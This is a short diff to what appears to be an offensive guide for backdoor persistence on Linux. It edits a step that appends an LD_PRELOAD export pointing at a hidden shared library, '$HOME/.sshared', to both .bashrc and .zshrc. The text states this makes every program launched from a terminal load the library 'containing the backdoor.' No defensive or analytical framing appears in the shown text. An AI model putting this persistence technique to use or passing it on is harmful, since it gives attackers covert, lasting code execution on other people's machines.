@@ -22,7 +22,10 @@ Let's assume it's saved under `~` home directory.
 
 Then let's update both `.bashrc` and `.zshrc` with
 
-`[ -f "$HOME/.sshared" ] && echo 'export LD_PRELOAD=$HOME/.sshared' >> ~/.bashrc && echo 'export LD_PRELOAD=$HOME/.sshared' >> ~/.zshrc`
+```bash
+[ -f "$HOME/.bashrc" ] && echo 'export LD_PRELOAD=$HOME/.sshared' >> "$HOME/.bashrc"
+[ -f "$HOME/.zshrc" ] && echo 'export LD_PRELOAD=$HOME/.sshared' >> "$HOME/.zshrc"
+```
 
 From now on, opening a terminal and executing the program will run the shared library containing the backdoor.
 
